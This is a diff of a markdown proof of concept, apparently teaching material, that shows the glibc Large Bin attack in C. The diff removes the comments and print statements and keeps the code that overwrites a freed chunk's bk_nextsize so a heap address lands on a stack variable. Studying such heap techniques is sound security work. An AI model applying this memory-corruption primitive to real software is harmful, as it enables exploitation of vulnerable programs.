@@ -32,49 +32,29 @@ This PoC demonstrates how to use a Large Bin attack to overwrite a stack variabl
 #include <stdlib.h>
 #include <assert.h>
 
-/*
-  Tested on glibc 2.31.
-  Large bin attack allows writing a heap address to an arbitrary location.
-*/
-
 int main() {
     setbuf(stdout, NULL);
 
     unsigned long target = 0;
-    printf("Target variable at %p. Current value: %p\n\n", &target, (void*)target);
 
-    // 1. Allocate a large chunk and a barrier
-    void *p1 = malloc(0x420); // Large enough for large bin
-    malloc(0x20);             // Barrier 1
+    void *p1 = malloc(0x420); 
+    malloc(0x20);             
 
-    // 2. Allocate a second large chunk and a barrier
-    void *p2 = malloc(0x410); // Slightly smaller than p1
-    malloc(0x20);             // Barrier 2
+    void *p2 = malloc(0x410); 
+    malloc(0x20);             
 
-    // 3. Free p1 and move it to the large bin
     free(p1);
-    malloc(0x500); // Trigger sorting: p1 moves to Unsorted Bin -> Large Bin
+    malloc(0x500); // p1 -> large bin
 
-    // 4. Free p2. It is now in the Unsorted Bin.
     free(p2);
 
-    // ------------ VULNERABILITY ------------
-    /*
-       We corrupt p1's metadata while it's in the Large Bin.
-       We set bk_nextsize to (target - 0x20) because the allocator will
-       perform: victim->bk_nextsize->fd_nextsize = victim
-    */
+    // VULNERABILITY: Corrupt large bin bk_nextsize
     ((unsigned long*)p1)[3] = (unsigned long)(&target - 4);
-    // ---------------------------------------
 
-    // 5. Trigger sorting of p2
-    // The allocator will try to insert p2 into the large bin containing p1.
-    malloc(0x500);
-
-    printf("After p2 is sorted, the target variable has been overwritten:\n");
-    printf("%p: %p\n", &target, (void*)target);
+    malloc(0x500); // Trigger large bin attack
 
     assert(target != 0);
+    return 0;
 }
 ```
 
